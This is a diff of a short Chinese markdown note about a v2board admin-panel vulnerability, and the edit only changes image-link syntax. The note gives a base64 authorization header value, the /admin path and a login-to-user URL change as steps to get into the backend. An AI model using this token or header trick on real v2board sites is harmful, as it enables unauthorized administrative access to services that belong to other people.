@@ -1,6 +1,6 @@
 紧跟时事.jpg
 
-![[Pasted image 20230113201736.png|500]]
+![](<./img/Pasted image 20230113201736.png>)
 
 这架势不会真的要复盘罢qaq
 
@@ -12,9 +12,9 @@
 
 进入管理面板
 
-![[Pasted image 20230113202029.png|1000]]
+![](<./img/Pasted image 20230113202029.png>)
 
-![[Pasted image 20230113202207.png|1000]]
+![](<./img/Pasted image 20230113202207.png>)
 
 ```
 authorization:"MTIzQHFxLmNvbTokMnkkMTAkSjcucmpWNXNHYkFFejlYeEFha3FYdUlBNWQxbFRiRDhReHNPbFN4eXdxNWM1bnJMbmF3aEc="
@@ -22,7 +22,7 @@ authorization:"MTIzQHFxLmNvbTokMnkkMTAkSjcucmpWNXNHYkFFejlYeEFha3FYdUlBNWQxbFRiR
 
 添加请求头
 
-![[Pasted image 20230113202506.png]]
+![](<./img/Pasted image 20230113202506.png>)
 
 进入后台
 
@@ -30,10 +30,10 @@ authorization:"MTIzQHFxLmNvbTokMnkkMTAkSjcucmpWNXNHYkFFejlYeEFha3FYdUlBNWQxbFRiR
 /admin
 ```
 
-![[Pasted image 20230113202604.png|1000]]
+![](<./img/Pasted image 20230113202604.png>)
 
 直接将`url`中的`login`改为`user`
 
-![[Pasted image 20230113202706.png|1000]]
+![](<./img/Pasted image 20230113202706.png>)
 
 #Web #Vulnerabilities #v2board #token 
